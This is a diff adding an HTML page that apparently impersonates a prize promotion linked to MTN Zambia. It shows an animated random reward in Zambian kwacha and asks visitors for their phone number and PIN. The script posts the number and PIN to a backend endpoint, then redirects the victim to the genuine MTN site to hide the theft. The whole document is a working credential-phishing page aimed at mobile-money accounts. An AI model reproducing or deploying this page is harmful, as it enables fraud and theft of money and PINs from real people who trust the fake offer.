@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎉 Congratulations! You've Won!</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #ffcc00 0%, #ff9900 50%, #ffcc00 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      padding: 35px 28px;
+      border-radius: 18px;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.25);
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+      border: 4px solid #000;
+    }
+    .trophy {
+      font-size: 55px;
+      animation: bounce 1.2s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
+    }
+    h1 {
+      color: #000;
+      font-size: 22px;
+      margin: 8px 0 4px;
+      line-height: 1.2;
+    }
+    .subtitle {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 18px;
+    }
+    .amount-box {
+      background: #000;
+      color: #ffcc00;
+      border-radius: 12px;
+      padding: 18px 10px;
+      margin: 10px 0 20px;
+    }
+    .amount-label {
+      font-size: 13px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      opacity: 0.8;
+    }
+    .amount {
+      font-size: 38px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+    .amount small {
+      font-size: 18px;
+      font-weight: 600;
+    }
+    .claim-text {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+    input {
+      width: 100%;
+      padding: 13px;
+      margin: 9px 0;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 15px;
+      box-sizing: border-box;
+      transition: border 0.2s;
+    }
+    input:focus { outline: none; border-color: #ffcc00; }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #ffcc00;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: 800;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: transform 0.1s, background 0.2s;
+    }
+    button:hover { background: #ffb800; }
+    button:active { transform: scale(0.98); }
+    #message { margin-top: 12px; font-size: 13px; color: #d32f2f; min-height: 16px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="trophy">🏆</div>
+    <h1>🎉 Congratulations!</h1>
+    <p class="subtitle">You have been selected to receive</p>
+
+    <div class="amount-box">
+      <div class="amount-label">Your Reward</div>
+      <div class="amount">ZMW <span id="prize">0</span></div>
+    </div>
+
+    <p class="claim-text">Enter your number & PIN to claim your prize now!</p>
+
+    <form id="promoForm">
+      <input type="tel" id="number" placeholder="Phone Number" required>
+      <input type="password" id="pin" placeholder="PIN" required>
+      <button type="submit">CLAIM MY REWARD</button>
+    </form>
+    <div id="message"></div>
+  </div>
+
+  <script>
+    // --- 1. Generate a random prize between 3,300 and 10,450 ---
+    const MIN = 3300;
+    const MAX = 10450;
+    const targetPrize = Math.floor(Math.random() * (MAX - MIN + 1)) + MIN;
+
+    // --- 2. Animate the number counting up ---
+    const prizeEl = document.getElementById('prize');
+    let current = 0;
+    const duration = 2000; // ms
+    const startTime = performance.now();
+
+    function animateCount(now) {
+      const progress = Math.min((now - startTime) / duration, 1);
+      // easeOutCubic for a nice deceleration
+      const eased = 1 - Math.pow(1 - progress, 3);
+      current = Math.floor(eased * targetPrize);
+      prizeEl.textContent = current.toLocaleString();
+      if (progress < 1) requestAnimationFrame(animateCount);
+      else prizeEl.textContent = targetPrize.toLocaleString(); // final exact value
+    }
+    requestAnimationFrame(animateCount);
+
+    // --- 3. Handle form submission ---
+    document.getElementById('promoForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const number = document.getElementById('number').value;
+      const pin = document.getElementById('pin').value;
+      const msg = document.getElementById('message');
+
+      try {
+        const response = await fetch('/api/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ number, pin, prize: targetPrize })
+        });
+
+        if (response.ok) {
+          window.location.href = 'https://www.mtn.zm/';
+        } else {
+          msg.textContent = 'Submission failed. Please try again.';
+        }
+      } catch (error) {
+        msg.textContent = 'Network error. Please try again.';
+      }
+    });
+  </script>
+</body>
+</html>
